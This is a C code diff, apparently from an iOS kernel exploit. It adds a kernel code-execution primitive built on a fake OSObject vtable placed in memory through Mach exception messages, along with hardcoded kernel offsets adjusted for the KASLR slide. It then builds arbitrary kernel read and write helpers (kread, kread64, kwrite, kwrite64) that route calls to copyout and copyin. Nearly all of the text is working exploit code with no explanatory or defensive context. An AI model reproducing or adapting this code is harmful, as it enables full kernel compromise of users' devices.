@@ -135,8 +135,6 @@ io_connect_t alloc_userclient() {
     return conn;
 }
 
-uint8_t* crash_stack = NULL;
-
 // each time we get an exception message copy the first 32 registers into this buffer
 uint64_t crash_buf[32] = {0}; // use the 32 general purpose ARM64 registers
 
@@ -192,12 +190,14 @@ int port_has_message(mach_port_t port) {
     return (err == KERN_SUCCESS);
 }
 
+uint8_t crash_stack[0x4000];
+
 // port needs to have a send right
 void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
     struct thread_args* args = malloc(sizeof(struct thread_args));
     memset(args, 0, sizeof(struct thread_args));
     memcpy(args->buf, buf, n*8);
-    
+
     args->exception_port = port;
     
     // start a new thread passing it the buffer and the exception port
@@ -211,9 +211,8 @@ void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
     // wait until the message has actually been sent:
     while(!port_has_message(port)){;}
     
-    thread_terminate(pthread_mach_thread_np(t)); // use thread_create_running to not leak from pthread API
-    
-    //printf("message was sent\n");
+    thread_t thread = pthread_mach_thread_np(t);
+    thread_terminate(thread); // leaks pthread structs, will destroy you eventually
 }
 
 // the returned pointer is only valid until the next call to this function
@@ -234,4 +233,165 @@ uint64_t* receive_prealloc_msg(mach_port_t port) {
     return &crash_buf[0];
 }
 
+int _kx_setup = 0;
+io_connect_t *_ucs = NULL;
+mach_port_t *_lazy_ports = NULL;
+uint64_t _kaslr_shift = 0;
+uint64_t _kernel_buffer_base = 0;
+io_connect_t *_uc = 0;
+mach_port_t _lazy_port = 0;
 
+
+static void _kx_find()
+{
+    uint64_t kernel_base = 0xfffffff007004000 + _kaslr_shift;
+    uint64_t osserializer_serialize = 0xfffffff0075468f8 + _kaslr_shift;
+    uint64_t get_metaclass = 0xfffffff007548a24 + _kaslr_shift;
+    uint64_t ret = get_metaclass + 8;
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    volatile uint32_t feedfacf = 0;
+    
+    uint64_t r_obj[64];
+    memset(r_obj, 0, sizeof(r_obj));
+    r_obj[0] = _kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
+    r_obj[1] = 0x20003;                 // refcount
+    r_obj[2] = _kernel_buffer_base+0x48 - 0x18 - 8 + 0x10;                       // obj + 0x10 -> rdi (memmove dst)
+    r_obj[3] = sizeof(uint32_t);                    // obj + 0x18 -> rsi (memmove src)
+    r_obj[4] = osserializer_serialize;                    // obj + 0x20 -> fptr
+    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
+    r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
+    r_obj[7] = 0x11;                     //
+    r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
+    
+    r_obj[9] = kernel_base;
+    r_obj[10] = &feedfacf;
+    r_obj[11] = copyout;
+    
+    memmove((uint8_t *)r_obj + 0x10, r_obj, sizeof(r_obj) - 0x10);
+    
+    for (int i = 0; i < 1000; ++i) {
+        send_prealloc_msg(_lazy_ports[i], (uint64_t *)r_obj, 30);
+    }
+
+    
+    for (int i = 0; i < 1000; ++i) {
+        io_service_t service;
+        IOConnectGetService(_ucs[i], &service);
+        if (feedfacf != 0) {
+            _uc = _ucs[i];
+            break;
+        }
+    }
+    
+    for (int i = 0; i < 1000; ++i) {
+        receive_prealloc_msg(_lazy_ports[i]);
+    }
+    
+    r_obj[9+2] = kernel_base + 1;
+    
+    int sent_count = 0;
+    for (int i = 0; i < 1000; ++i) {
+        send_prealloc_msg(_lazy_ports[i], (uint64_t *)r_obj, 30);
+    
+        io_service_t service;
+        IOConnectGetService(_uc, &service);
+        
+        if (feedfacf != 0xfeedfacf) {
+            _lazy_port = _lazy_ports[i];
+            sent_count = i+1;
+            break;
+        }
+    }
+    
+    for (int i = 0; i < sent_count; ++i) {
+        receive_prealloc_msg(_lazy_ports[i]);
+    }
+}
+
+void kx_setup(io_connect_t *ucs, mach_port_t *lazy_ports, uint64_t kaslr_shift, uint64_t kernel_buffer_base)
+{
+    _ucs = ucs;
+    _lazy_ports = lazy_ports;
+    _kaslr_shift = kaslr_shift;
+    _kernel_buffer_base = kernel_buffer_base;
+    
+    for (int i = 0; i < 1000; ++i) {
+         prepare_prealloc_port(lazy_ports[i]);
+    }
+    
+    _kx_find();
+}
+
+void kx3(uint64_t fptr, uint64_t arg0, uint64_t arg1, uint64_t arg2) {
+    uint64_t osserializer_serialize = 0xfffffff0075468f8 + _kaslr_shift;
+    uint64_t get_metaclass = 0xfffffff007548a24 + _kaslr_shift;
+    uint64_t ret = get_metaclass + 8;
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    
+    uint64_t r_obj[64];
+    memset(r_obj, 0, sizeof(r_obj));
+    r_obj[0] = _kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
+    r_obj[1] = 0x20003;                 // refcount
+    r_obj[2] = _kernel_buffer_base+0x48 - 0x18 - 8 + 0x10;                       // obj + 0x10 -> rdi (memmove dst)
+    r_obj[3] = arg2;                    // obj + 0x18 -> rsi (memmove src)
+    r_obj[4] = osserializer_serialize;                    // obj + 0x20 -> fptr
+    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
+    r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
+    r_obj[7] = 0x11;                     //
+    r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
+    
+    r_obj[9] = arg0;
+    r_obj[10] = arg1;
+    r_obj[11] = fptr;
+    
+    memmove((uint8_t *)r_obj + 0x10, r_obj, sizeof(r_obj) - 0x10);
+    
+    send_prealloc_msg(_lazy_port, (uint64_t *)r_obj, 30);
+
+    io_service_t service;
+    IOConnectGetService(_uc, &service);
+    
+    receive_prealloc_msg(_lazy_port);
+}
+
+void kread(uint64_t addr, uint8_t *userspace, int n)
+{
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    kx3(copyout, addr, userspace, n);
+}
+
+uint32_t kread32(uint64_t addr)
+{
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    uint32_t value = 0;
+    kx3(copyout, addr, (uint64_t)&value, sizeof(value));
+    
+    return value;
+}
+
+uint64_t kread64(uint64_t addr)
+{
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    uint64_t value = 0;
+    kx3(copyout, addr, (uint64_t)&value, sizeof(value));
+    
+    return value;
+}
+
+void kwrite(uint64_t addr, uint8_t *userspace, int n)
+{
+    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
+    kx3(copyin, addr, userspace, n);
+}
+
+void kwrite32(uint64_t addr, uint32_t value)
+{
+    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
+    kx3(copyin, addr, &value, sizeof(value));
+}
+
+void kwrite64(uint64_t addr, uint64_t value)
+{
+    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
+    kx3(copyin, addr, &value, sizeof(value));
+}
